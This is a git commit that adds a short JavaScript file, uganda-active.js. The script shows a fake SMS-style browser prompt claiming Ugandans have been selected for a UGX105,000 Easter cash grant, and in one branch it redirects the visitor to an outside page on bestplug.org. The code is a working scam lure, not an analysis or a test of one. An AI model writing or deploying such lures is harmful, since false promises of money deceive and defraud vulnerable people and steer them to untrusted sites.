0e8b3832518dde6257b2fd78450d357dce9a9a09
vibeblog <enom02567@gmail.com>
2025-04-15 19:09:16 +0100

    Create uganda-active.js

---
+++ uganda-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW UGX105,000'
+password=prompt('SMS: Congratulations, you are among the selected Ugandans to receive UGX105,000 as Easter Celebration cash grant, Press Ok to withdraw cash Now ','WITHDRAW UGX105,000');
+if (password != 'WITHDRAW UGX105,000') {
+location.href='https://bestplug.org/uganda-easter';
+}
